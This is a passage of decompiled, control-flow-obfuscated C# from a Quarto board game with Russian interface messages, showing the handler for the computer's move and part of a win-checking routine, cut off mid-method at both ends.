					num = ((int)num2 * -235396297) ^ -1686436963;
					continue;
				case 1u:
					num = ((int)num2 * -2090406087) ^ -238030184;
					continue;
				case 0u:
					num = ((int)num2 * -1274959276) ^ 0x49E55E0B;
					continue;
				default:
					return;
				case 23u:
					break;
				case 20u:
					return;
					IL_02bb:
					flag = (byte)num11 != 0;
					num = -1143220190;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0f06: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f34: Expected O, but got Unknown
		int num3 = default(int);
		Graphics graphics_ = default(Graphics);
		int num14 = default(int);
		int num10 = default(int);
		int num29 = default(int);
		int num30 = default(int);
		int num21 = default(int);
		int num11 = default(int);
		int num24 = default(int);
		int num4 = default(int);
		bool flag3 = default(bool);
		int num18 = default(int);
		bool flag17 = default(bool);
		int num13 = default(int);
		int num22 = default(int);
		bool flag18 = default(bool);
		int num9 = default(int);
		int num35 = default(int);
		bool flag8 = default(bool);
		bool flag15 = default(bool);
		Figurine[,] array3 = default(Figurine[,]);
		bool flag11 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		Figurine[,] array = default(Figurine[,]);
		int num19 = default(int);
		int num23 = default(int);
		int num28 = default(int);
		bool flag4 = default(bool);
		bool flag10 = default(bool);
		bool flag16 = default(bool);
		bool flag13 = default(bool);
		bool flag5 = default(bool);
		int num31 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		bool flag14 = default(bool);
		bool flag9 = default(bool);
		int num12 = default(int);
		int num20 = default(int);
		int num42 = default(int);
		bool flag6 = default(bool);
		bool flag12 = default(bool);
		bool flag7 = default(bool);
		while (true)
		{
			int num = -1814613658;
			while (true)
			{
				uint num2;
				int num61;
				int num48;
				int num32;
				int num15;
				switch ((num2 = (uint)num ^ 0x97A388BBu) % 179u)
				{
				case 178u:
					num3++;
					num = (int)((num2 * 1046440727) ^ 0x16C971D9);
					continue;
				case 177u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num14, num10]), num29 * size + 4, num30 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 408868296) ^ 0xEFC0E83);
					continue;
				case 176u:
					num = ((int)num2 * -1059385446) ^ -858237491;
					continue;
				case 175u:
					num = ((int)num2 * -844048004) ^ -364381531;
					continue;
				case 174u:
					num = (int)((num2 * 289962758) ^ 0x52EDD12);
					continue;
				case 173u:
					num = (int)(num2 * 141932600) ^ -1404634547;
					continue;
				case 172u:
					Form1.smethod_30((Control)(object)pictureBox[num21, num11]);
					num = (int)(num2 * 838379219) ^ -2044228590;
					continue;
				case 171u:
				{
					int num50;
					if (num24 < 4)
					{
						num = -1221438421;
						num50 = -1221438421;
					}
					else
					{
						num = -853781968;
						num50 = -853781968;
					}
					continue;
				}
				case 170u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 962092136) ^ 0x666305E7);
					continue;
				case 169u:
					Form1.smethod_30((Control)(object)borderBox[num21, num11]);
					num = ((int)num2 * -1410120851) ^ -933443672;
					continue;
				case 168u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.LimeGreen);
					num = (int)(num2 * 221775216) ^ -1083769114;
					continue;
				case 167u:
				{
					int num16;
					int num17;
					if (!flag3)
					{
						num16 = 587557222;
						num17 = 587557222;
					}
					else
					{
						num16 = 665935329;
						num17 = 665935329;
					}
					num = num16 ^ ((int)num2 * -2003667477);
					continue;
				}
				case 166u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -960860169) ^ 0x308EE22C;
					continue;
				case 165u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -1107313516) ^ 0x54AA97EC;
					continue;
				case 164u:
					Form1.smethod_5((Control)(object)borderBox[num21, num11], Color.White);
					num = (int)(num2 * 1561756091) ^ -1358240522;
					continue;
				case 163u:
					num18 = 0;
					num = ((int)num2 * -601645417) ^ -548543455;
					continue;
				case 162u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)(num2 * 2085130683) ^ -1369139709;
					continue;
				case 161u:
					flag17 = num21 < 4;
					num = -1516164225;
					continue;
				case 160u:
					Form1.smethod_5((Control)(object)borderBox[num13, num22], Color.Blue);
					num = (int)(num2 * 765753807) ^ -1134358864;
					continue;
				case 159u:
					flag18 = Form1.smethod_41((Control)(object)borderBox[num3, num4]) == Color.Red;
					num = (int)((num2 * 1936497512) ^ 0x1C959C0);
					continue;
				case 158u:
					num24++;
					num = ((int)num2 * -1561428946) ^ 0x4418F;
					continue;
				case 157u:
					num = (int)(num2 * 2013367384) ^ -1517070765;
					continue;
				case 156u:
					board[num9, num35] = new Figurine(storage[num14, num10]);
					storage[num14, num10] = null;
					flag8 = Standoff(board);
					num = ((int)num2 * -812052479) ^ 0x7A0D6CDD;
					continue;
				case 155u:
					num4 = 0;
					num = -1554573537;
					continue;
				case 154u:
					if (!Standoff(board))
					{
						num = -1461216449;
						num61 = -1461216449;
						continue;
					}
					goto IL_0374;
				case 153u:
					Form1.smethod_5((Control)(object)borderBox[num14, num10], Color.White);
					num = ((int)num2 * -2022697877) ^ 0x45F9B30C;
					continue;
				case 152u:
					board[num30, num29] = new Figurine(storage[num14, num10]);
					num = ((int)num2 * -1606726162) ^ -1010501048;
					continue;
				case 151u:
					num = ((int)num2 * -747322751) ^ -260170518;
					continue;
				case 150u:
					num = ((int)num2 * -1552873953) ^ 0x4619868;
					continue;
				case 149u:
					flag15 = num11 < 4;
					num = -1907289021;
					continue;
				case 148u:
				{
					int num53;
					int num54;
					if (flag15)
					{
						num53 = -1974887323;
						num54 = -1974887323;
					}
					else
					{
						num53 = -1304915478;
						num54 = -1304915478;
					}
					num = num53 ^ (int)(num2 * 1047765557);
					continue;
				}
				case 147u:
					if (!Stop(array3))
					{
						num = ((int)num2 * -311828743) ^ 0x208C64A9;
						continue;
					}
					num48 = 1;
					goto IL_0464;
				case 146u:
					Form1.smethod_20(pictureBox[num21, num11], (Image)null);
					num = ((int)num2 * -1445083125) ^ 0x71A2E78;
					continue;
				case 145u:
					num24 = 0;
					num = -303794107;
					continue;
				case 144u:
					Form1.smethod_47(200);
					num = (int)((num2 * 2092312116) ^ 0x109EF350);
					continue;
				case 143u:
					flag11 = num4 < 4;
					num = -1679026709;
					continue;
				case 142u:
					Form1.smethod_30((Control)(object)borderBox[num13, num22]);
					num = ((int)num2 * -540472643) ^ -532638960;
					continue;
				case 141u:
					num14 = 0;
					num = ((int)num2 * -1883821211) ^ -1842708875;
					continue;
				case 140u:
					num35++;
					num = -1225823693;
					continue;
				case 138u:
					array2 = (Figurine[,])Form1.smethod_48((Array)array);
					array2[num18, num19] = new Figurine(storage[num13, num22]);
					num = (int)(num2 * 1179078477) ^ -1966598585;
					continue;
				case 137u:
					Form1.smethod_47(1000);
					num = (int)((num2 * 155904142) ^ 0x2B26BF2F);
					continue;
				case 136u:
					num23++;
					num = (int)((num2 * 1126551631) ^ 0x705B52F9);
					continue;
				case 135u:
					num = ((int)num2 * -2050453561) ^ 0x3DE3DA61;
					continue;
				case 134u:
				{
					int num36;
					int num37;
					if (!flag8)
					{
						num36 = -209841010;
						num37 = -209841010;
					}
					else
					{
						num36 = -1276096923;
						num37 = -1276096923;
					}
					num = num36 ^ (int)(num2 * 1408306070);
					continue;
				}
				case 133u:
					num21++;
					num = ((int)num2 * -1551218292) ^ 0x4412BDAC;
					continue;
				case 132u:
					num = ((int)num2 * -501924856) ^ -162985527;
					continue;
				case 131u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 327862836) ^ 0x62994B1C);
					continue;
				case 130u:
					num = (int)(num2 * 658508158) ^ -471283562;
					continue;
				case 129u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num29 + 0.05f) * (float)size, ((float)num30 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)(num2 * 1669949944) ^ -768859973;
					continue;
				case 128u:
					num28 = num21;
					num = ((int)num2 * -1701941922) ^ 0x42A86BB1;
					continue;
				case 127u:
					num = -1285827435;
					continue;
				case 126u:
					num = (int)((num2 * 91232065) ^ 0x1FA7F192);
					continue;
				case 125u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = ((int)num2 * -1874884969) ^ -1705825448;
					continue;
				case 124u:
					flag4 = array[num18, num19] == null;
					num = -630002006;
					continue;
				case 123u:
				{
					int num7;
					int num8;
					if (Form1.smethod_46((Control)(object)pictureBox1))
					{
						num7 = -1783921112;
						num8 = -1783921112;
					}
					else
					{
						num7 = -501946512;
						num8 = -501946512;
					}
					num = num7 ^ ((int)num2 * -675914635);
					continue;
				}
				case 122u:
					num28 = 0;
					num = ((int)num2 * -732152645) ^ 0x4352F8A3;
					continue;
				case 121u:
					num = ((int)num2 * -1610247728) ^ 0x72B6EB9F;
					continue;
				case 120u:
				{
					int num67;
					int num68;
					if (!flag18)
					{
						num67 = -636177684;
						num68 = -636177684;
					}
					else
					{
						num67 = -184243630;
						num68 = -184243630;
					}
					num = num67 ^ ((int)num2 * -115678777);
					continue;
				}
				case 119u:
					num = ((int)num2 * -1075806725) ^ 0x73B6C72B;
					continue;
				case 118u:
					num = (int)((num2 * 251615038) ^ 0x6E7FA385);
					continue;
				case 117u:
					if (!flag10)
					{
						num = ((int)num2 * -1666252447) ^ -1388887918;
						continue;
					}
					num32 = 1;
					goto IL_07c1;
				case 116u:
					flag16 = Form1.smethod_41((Control)(object)borderBox[num21, num11]) == Color.Blue;
					num = (int)(num2 * 1497764383) ^ -1033360355;
					continue;
				case 115u:
				{
					int num65;
					int num66;
					if (!flag17)
					{
						num65 = 56889274;
						num66 = 56889274;
					}
					else
					{
						num65 = 1726708193;
						num66 = 1726708193;
					}
					num = num65 ^ ((int)num2 * -555218795);
					continue;
				}
				case 114u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -1512896466) ^ 0x2BF2DE29;
					continue;
				case 113u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)(num2 * 859778694) ^ -1974057297;
					continue;
				case 112u:
					num30 = Form1.smethod_33(rnd, 4);
					num = -134209758;
					continue;
				case 111u:
				{
					int num64;
					if (num35 < 4)
					{
						num = -839538898;
						num64 = -839538898;
					}
					else
					{
						num = -421071890;
						num64 = -421071890;
					}
					continue;
				}
				case 110u:
					num3 = 0;
					num = (int)((num2 * 477542751) ^ 0x1A032E45);
					continue;
				case 109u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 32382138) ^ 0x66343367);
					continue;
				case 108u:
					num = (int)((num2 * 1546445988) ^ 0x1B2D46FF);
					continue;
				case 107u:
					num19 = 0;
					num = -1659333214;
					continue;
				case 106u:
					num = -1530716478;
					continue;
				case 105u:
					num14 = num3;
					num = (int)((num2 * 973061624) ^ 0x55DE5AA9);
					continue;
				case 104u:
					flag13 = num18 < 4;
					num = -1493816576;
					continue;
				case 103u:
					num = -402496553;
					continue;
				case 102u:
					num10 = num4;
					num = (int)(num2 * 2017630544) ^ -1087024759;
					continue;
				case 101u:
				{
					int num62;
					int num63;
					if (!flag5)
					{
						num62 = -1322968981;
						num63 = -1322968981;
					}
					else
					{
						num62 = -1884118413;
						num63 = -1884118413;
					}
					num = num62 ^ ((int)num2 * -241389388);
					continue;
				}
				case 100u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1559946760) ^ -1794667356;
					continue;
				case 99u:
					num = ((int)num2 * -1577129650) ^ -217584317;
					continue;
				case 98u:
				{
					int num59;
					int num60;
					if (!flag16)
					{
						num59 = -46123608;
						num60 = -46123608;
					}
					else
					{
						num59 = -410625954;
						num60 = -410625954;
					}
					num = num59 ^ (int)(num2 * 1372212538);
					continue;
				}
				case 97u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -2074787343) ^ -608017179;
					continue;
				case 96u:
					num31++;
					flag10 = false;
					num = -1244574501;
					continue;
				case 95u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)((num2 * 1686689257) ^ 0x7609F891);
					continue;
				case 94u:
					num = ((int)num2 * -1541517406) ^ 0x5504B79A;
					continue;
				case 93u:
					num = -363152222;
					continue;
				case 92u:
				{
					int num57;
					int num58;
					if (!flag2)
					{
						num57 = 1536956984;
						num58 = 1536956984;
					}
					else
					{
						num57 = 882132424;
						num58 = 882132424;
					}
					num = num57 ^ (int)(num2 * 525604207);
					continue;
				}
				case 91u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					Form1.smethod_30((Control)(object)label2);
					num = (int)(num2 * 1990634978) ^ -1189907901;
					continue;
				case 90u:
					num = ((int)num2 * -46933373) ^ -294102821;
					continue;
				case 89u:
					num19++;
					num = -1659333214;
					continue;
				case 88u:
					num = -1533319854;
					continue;
				case 87u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					array3[num9, num35] = new Figurine(storage[num14, num10]);
					num = ((int)num2 * -1766651426) ^ 0x1FF94186;
					continue;
				case 86u:
					num = ((int)num2 * -1435572227) ^ 0x651DC38C;
					continue;
				case 85u:
					flag = board[num30, num29] != null;
					num = ((int)num2 * -618704814) ^ 0x7D031B54;
					continue;
				case 84u:
				{
					int num55;
					int num56;
					if (!flag14)
					{
						num55 = -1249181491;
						num56 = -1249181491;
					}
					else
					{
						num55 = -630337553;
						num56 = -630337553;
					}
					num = num55 ^ ((int)num2 * -214612357);
					continue;
				}
				case 83u:
				{
					int num51;
					int num52;
					if (!flag9)
					{
						num51 = 283556224;
						num52 = 283556224;
					}
					else
					{
						num51 = 646785060;
						num52 = 646785060;
					}
					num = num51 ^ (int)(num2 * 1885437302);
					continue;
				}
				case 82u:
					step++;
					num = (int)((num2 * 1192154301) ^ 0x1591AA9A);
					continue;
				case 81u:
					board[num28, num12] = new Figurine(storage[num20, num42]);
					storage[num20, num42] = null;
					Paint_Board();
					num = (int)(num2 * 1406751456) ^ -1665398708;
					continue;
				case 80u:
					array[num30, num29] = new Figurine(storage[num14, num10]);
					num = (int)(num2 * 922478304) ^ -775137523;
					continue;
				case 79u:
					num18++;
					num = (int)(num2 * 874059956) ^ -86155139;
					continue;
				case 78u:
					num20 = num21;
					num42 = num11;
					num = (int)(num2 * 1871367697) ^ -223385019;
					continue;
				case 77u:
					num = -748203840;
					continue;
				case 76u:
					num31 = 0;
					num = ((int)num2 * -1815358803) ^ -1965228454;
					continue;
				case 75u:
					step++;
					num = (int)((num2 * 1629132688) ^ 0x4816B23);
					continue;
				case 74u:
					num = (int)(num2 * 1319800854) ^ -179656256;
					continue;
				case 73u:
				{
					int num49;
					if (num9 < 4)
					{
						num = -323598316;
						num49 = -323598316;
					}
					else
					{
						num = -500395279;
						num49 = -500395279;
					}
					continue;
				}
				case 72u:
					num = -195676824;
					continue;
				case 71u:
					num48 = (Standoff(array3) ? 1 : 0);
					goto IL_0464;
				case 70u:
					if (!Stop(board))
					{
						num = (int)(num2 * 1722688126) ^ -1850942776;
						continue;
					}
					goto IL_0374;
				case 69u:
					num = (int)(num2 * 2807959) ^ -1378005135;
					continue;
				case 68u:
					Form1.smethod_20(pictureBox[num14, num10], (Image)null);
					Form1.smethod_30((Control)(object)pictureBox[num14, num10]);
					num = ((int)num2 * -1054255975) ^ 0x1A7EC65C;
					continue;
				case 67u:
					num = ((int)num2 * -1542609897) ^ 0x56C90009;
					continue;
				case 66u:
					num4++;
					num = (int)((num2 * 1395849719) ^ 0x76BD60EC);
					continue;
				case 65u:
				{
					int num46;
					int num47;
					if (!flag4)
					{
						num46 = 985433972;
						num47 = 985433972;
					}
					else
					{
						num46 = 1254039562;
						num47 = 1254039562;
					}
					num = num46 ^ (int)(num2 * 607503452);
					continue;
				}
				case 64u:
					Form1.smethod_30((Control)(object)borderBox[num3, num4]);
					num = (int)(num2 * 501720163) ^ -2005863733;
					continue;
				case 63u:
				{
					int num45;
					if (board[num9, num35] != null)
					{
						num = -1533319854;
						num45 = -1533319854;
					}
					else
					{
						num = -1082641248;
						num45 = -1082641248;
					}
					continue;
				}
				case 62u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num35 + 0.05f) * (float)size, ((float)num9 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -2144123357) ^ 0x6B21DAFE;
					continue;
				case 61u:
					num = (int)(num2 * 834533905) ^ -988003171;
					continue;
				case 60u:
					flag14 = Standoff(board);
					num = -1552679448;
					continue;
				case 59u:
				{
					int num43;
					int num44;
					if (flag13)
					{
						num43 = 196076113;
						num44 = 196076113;
					}
					else
					{
						num43 = 142982951;
						num44 = 142982951;
					}
					num = num43 ^ (int)(num2 * 2136976482);
					continue;
				}
				case 58u:
					flag6 = Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num11 * size + size / 2, (int)(((float)num21 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0);
					num = -450900018;
					continue;
				case 57u:
					num42 = 0;
					num = ((int)num2 * -1927127654) ^ 0xB1B025F;
					continue;
				case 56u:
					num29 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1281894544) ^ 0x9BBD873;
					continue;
				case 55u:
					num = -515142307;
					continue;
				case 54u:
					Form1.smethod_30((Control)(object)pictureBox[num14, num10]);
					num = (int)((num2 * 1216059922) ^ 0x451C1280);
					continue;
				case 53u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1910945102) ^ -1737822115;
					continue;
				case 52u:
				{
					int num40;
					int num41;
					if (!flag12)
					{
						num40 = 2051590914;
						num41 = 2051590914;
					}
					else
					{
						num40 = 1956607355;
						num41 = 1956607355;
					}
					num = num40 ^ (int)(num2 * 1893154167);
					continue;
				}
				case 51u:
					num = (int)((num2 * 329115637) ^ 0x50B92D5C);
					continue;
				case 50u:
					num = (int)(num2 * 311729580) ^ -8772615;
					continue;
				case 49u:
					num23 = 0;
					num = ((int)num2 * -1985707256) ^ 0x72161958;
					continue;
				case 47u:
					num9++;
					num = (int)(num2 * 336675413) ^ -1888932832;
					continue;
				case 46u:
				{
					int num38;
					int num39;
					if (!flag11)
					{
						num38 = -1200012692;
						num39 = -1200012692;
					}
					else
					{
						num38 = -1184737076;
						num39 = -1184737076;
					}
					num = num38 ^ ((int)num2 * -939553154);
					continue;
				}
				case 45u:
					num = ((int)num2 * -1131606659) ^ -526689993;
					continue;
				case 44u:
					num11 = 0;
					num = -530259886;
					continue;
				case 43u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num14, num10]), num35 * size + 4, num9 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 175125787) ^ -1571877992;
					continue;
				case 42u:
					flag3 = num19 < 4;
					num = -682296133;
					continue;
				case 41u:
					storage[num14, num10] = null;
					num = (int)((num2 * 1811069401) ^ 0x3EA991A5);
					continue;
				case 40u:
					num11++;
					num = ((int)num2 * -308770629) ^ -1264868330;
					continue;
				case 39u:
					Form1.smethod_30((Control)(object)borderBox[num14, num10]);
					num = (int)(num2 * 625168978) ^ -2048729958;
					continue;
				case 38u:
					num = (int)((num2 * 1728197533) ^ 0x637D8655);
					continue;
				case 37u:
					flag10 = true;
					num = ((int)num2 * -2113384949) ^ 0x5BD8626B;
					continue;
				case 36u:
					if (storage[num13, num22] != null)
					{
						num = ((int)num2 * -208027759) ^ -1704051685;
						continue;
					}
					num15 = 1;
					goto IL_11bc;
				case 35u:
					num = ((int)num2 * -503390294) ^ -1465652093;
					continue;
				case 34u:
					num = (int)((num2 * 624681210) ^ 0x2A5F543D);
					continue;
				case 33u:
					num35 = 0;
					num = -1225823693;
					continue;
				case 32u:
					num = -485329202;
					continue;
				case 31u:
				{
					int num33;
					int num34;
					if (!flag7)
					{
						num33 = -936254029;
						num34 = -936254029;
					}
					else
					{
						num33 = -1455588339;
						num34 = -1455588339;
					}
					num = num33 ^ (int)(num2 * 878509383);
					continue;
				}
				case 30u:
					num32 = ((num31 < 9) ? 1 : 0);
					goto IL_07c1;
				case 29u:
				{
					int num26;
					int num27;
					if (!flag6)
					{
						num26 = 1361077451;
						num27 = 1361077451;
					}
					else
					{
						num26 = 1595478382;
						num27 = 1595478382;
					}
					num = num26 ^ ((int)num2 * -1486227457);
					continue;
				}
				case 28u:
					num = ((int)num2 * -351787141) ^ 0x1798C471;
					continue;
				case 27u:
					num = ((int)num2 * -1665306636) ^ 0x2B16D14F;
					continue;
				case 26u:
					num = -1917070425;
					continue;
				case 25u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -726390714) ^ 0x40B64DDC;
					continue;
				case 24u:
					num = ((int)num2 * -1266214904) ^ 0x7B674D19;
					continue;
				case 23u:
					flag5 = Stop(array2);
					num = (int)(num2 * 1559747474) ^ -1453333142;
					continue;
				case 22u:
					num = (int)(num2 * 2043050381) ^ -835630536;
					continue;
				case 21u:
				{
					int num25;
					if (num23 < 4)
					{
						num = -508337894;
						num25 = -508337894;
					}
					else
					{
						num = -111753248;
						num25 = -111753248;
					}
					continue;
				}
				case 20u:
					Form1.smethod_5((Control)(object)borderBox[num14, num10], Color.White);
					Form1.smethod_30((Control)(object)borderBox[num14, num10]);
					Form1.smethod_20(pictureBox[num14, num10], (Image)null);
					num = (int)((num2 * 1903017938) ^ 0x61E73C88);
					continue;
				case 19u:
					num15 = ((num22 == num10) ? 1 : 0);
					goto IL_11bc;
				case 18u:
					Form1.smethod_7((Control)(object)pictureBox[num23, num24], bool_0: true);
					num = -333676840;
					continue;
				case 17u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -250075168) ^ -817988358;
					continue;
				case 16u:
					num22 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 107052913) ^ 0x30F37AEB);
					continue;
				case 15u:
					num12 = 0;
					num21 = 0;
					num = (int)(num2 * 1241348995) ^ -523777936;
					continue;
				case 14u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)(num2 * 615543790) ^ -2126841613;
					continue;
				case 13u:
					num13 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -375871859) ^ 0x5E33EBDC;
					continue;
				case 12u:
					num20 = 0;
					num = (int)((num2 * 343623000) ^ 0x66AFBBA5);
					continue;
				case 11u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = -1982344713;
					continue;
				case 10u:
					if (num13 == num14)
					{
						num = (int)((num2 * 1884270880) ^ 0x60B591D2);
						continue;
					}
					num15 = 0;
					goto IL_11bc;
				case 9u:
					num12 = num11;
					num = ((int)num2 * -1871411803) ^ -307627804;
					continue;
				case 8u:
					flag2 = num3 < 4;
					num = -1506039034;
					continue;
				case 7u:
					num = ((int)num2 * -1433292883) ^ 0x6CECA6ED;
					continue;
				case 6u:
					num10 = 0;
					num = (int)(num2 * 2116132216) ^ -983073726;
					continue;
				case 5u:
					Form1.smethod_15(timer1);
					num = -1475142221;
					continue;
				case 4u:
					Form1.smethod_15(timer1);
					num = (int)((num2 * 1746622122) ^ 0x64DC8E97);
					continue;
				case 3u:
					num9 = 0;
					num = ((int)num2 * -29388679) ^ 0x330FCEAF;
					continue;
				case 2u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = -279670654;
						num6 = -279670654;
					}
					else
					{
						num5 = -1158498197;
						num6 = -1158498197;
					}
					num = num5 ^ ((int)num2 * -1430712816);
					continue;
				}
				case 1u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: false);
					num = (int)((num2 * 566343416) ^ 0x4B7FE0A);
					continue;
				case 0u:
					num = (int)((num2 * 1456389860) ^ 0x26CC5A39);
					continue;
				default:
					return;
				case 139u:
					break;
				case 48u:
					return;
					IL_11bc:
					flag9 = (byte)num15 != 0;
					num = -1230192566;
					continue;
					IL_0464:
					flag7 = (byte)num48 != 0;
					num = -40041796;
					continue;
					IL_0374:
					num = -973869822;
					num61 = -973869822;
					continue;
					IL_07c1:
					flag12 = (byte)num32 != 0;
					num = -662996466;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num5 = default(int);
		bool flag4 = default(bool);
		bool result = default(bool);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -1780419847;
			while (true)
			{
				uint num2;
				int num32;
				int num16;
				switch ((num2 = (uint)num ^ 0xC6D390A2u) % 77u)
				{
				case 76u:
					if (mem[num5, 2].Point != mem[num5, 3].Point)
					{
						num = (int)(num2 * 2142668424) ^ -1008447819;
						continue;
					}
					goto IL_0035;
				case 75u:
				{
					int num19;
					int num20;
					if (mem[num5, 1].Big == mem[num5, 2].Big)
					{
						num19 = -419519652;
						num20 = -419519652;
					}
					else
					{
						num19 = -627625239;
						num20 = -627625239;
					}
					num = num19 ^ (int)(num2 * 33135163);
					continue;
				}
				case 74u:
				{
					int num51;
					int num52;
					if (mem[1, 2].Point != mem[2, 1].Point)
					{
						num51 = 430597198;
						num52 = 430597198;
					}
					else
					{
						num51 = 1771833698;
						num52 = 1771833698;
					}
					num = num51 ^ (int)(num2 * 1363200876);
					continue;
				}
				case 73u:
				{
					int num71;
					int num72;
					if (flag4)
					{
						num71 = 996727076;
						num72 = 996727076;
					}
					else
					{
						num71 = 2129734975;
						num72 = 2129734975;
					}
					num = num71 ^ (int)(num2 * 1709554774);
					continue;
				}
				case 72u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = (int)(num2 * 1695945731) ^ -1121495908;
						continue;
					}
					goto IL_011a;
				case 71u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = -1571636641;
						continue;
					}
					goto IL_014d;
				case 70u:
					if (mem[2, num5].Big != mem[3, num5].Big)
					{
						num = ((int)num2 * -1473697706) ^ -1419578720;
						continue;
					}
					goto IL_017f;
				case 69u:
				{
					int num65;
					int num66;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num65 = -700803004;
						num66 = -700803004;
					}
					else
					{
						num65 = -806405405;
						num66 = -806405405;
					}
					num = num65 ^ ((int)num2 * -1916078624);
					continue;
				}
				case 68u:
					result = flag2;
					num = -185420882;
					continue;
				case 67u:
					if (mem[0, num5] != null)
					{
						num = -1226694333;
						continue;
					}
					goto IL_01e7;
				case 66u:
				{
					int num41;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = -86338164;
						num41 = -86338164;
					}
					else
					{
						num = -1391269221;
						num41 = -1391269221;
					}
					continue;
				}
				case 65u:
				{
					int num33;
					int num34;
					if (mem[num5, 1].Square != mem[num5, 2].Square)
					{
						num33 = -1677765696;
						num34 = -1677765696;
					}
					else
					{
						num33 = -831867845;
						num34 = -831867845;
					}
					num = num33 ^ ((int)num2 * -37879823);
					continue;
				}
				case 64u:
				{
					int num14;
					int num15;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num14 = 1154493260;
						num15 = 1154493260;
					}
					else
					{
						num14 = 182245712;
						num15 = 182245712;
					}
					num = num14 ^ (int)(num2 * 2116986658);
					continue;
				}
				case 63u:
				{
					int num12;
					int num13;
					if (mem[num5, 3] == null)
					{
						num12 = 1366317313;
						num13 = 1366317313;
					}
					else
					{
						num12 = 22413072;
						num13 = 22413072;
					}
					num = num12 ^ (int)(num2 * 622540420);
					continue;
				}
				case 62u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -1921804479) ^ -2011107006;
						continue;
					}
					goto IL_0305;
				case 61u:
				{
					int num58;
					int num59;
					if (mem[1, num5].Point != mem[2, num5].Point)
					{
						num58 = 1814706433;
						num59 = 1814706433;
					}
					else
					{
						num58 = 1012810546;
						num59 = 1012810546;
					}
					num = num58 ^ (int)(num2 * 251616076);
					continue;
				}
				case 60u:
				{
					int num47;
					int num48;
					if (mem[1, 1].Square == mem[2, 2].Square)
					{
						num47 = 590552320;
						num48 = 590552320;
					}
					else
					{
						num47 = 1574882466;
						num48 = 1574882466;
					}
					num = num47 ^ ((int)num2 * -846337169);
					continue;
				}
				case 59u:
				{
					int num42;
					int num43;
					if (mem[num5, 2] == null)
					{
						num42 = -1265588967;
						num43 = -1265588967;
					}
					else
					{
						num42 = -914159595;
						num43 = -914159595;
					}
					num = num42 ^ ((int)num2 * -1273572142);
					continue;
				}
				case 58u:
					if (mem[1, 2] != null)
					{
						num = ((int)num2 * -1088094989) ^ -1108562701;
						continue;
					}
					goto IL_03d9;
				case 57u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = ((int)num2 * -732283666) ^ -940272147;
						continue;
					}
					goto IL_0305;
				case 56u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = ((int)num2 * -1220734736) ^ 0x5296DF78;
						continue;
					}
					goto IL_011a;
				case 55u:
				{
					int num21;
					if (mem[0, num5].Point == mem[1, num5].Point)
					{
						num = -1787687174;
						num21 = -1787687174;
					}
					else
					{
						num = -1127845087;
						num21 = -1127845087;
					}
					continue;
				}
				case 54u:
				{
					int num8;
					int num9;
					if (mem[0, 0] != null)
					{
						num8 = 1188397262;
						num9 = 1188397262;
					}
					else
					{
						num8 = 594736867;
						num9 = 594736867;
					}
					num = num8 ^ ((int)num2 * -143259524);
					continue;
				}
				case 53u:
				{
					int num68;
					int num69;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
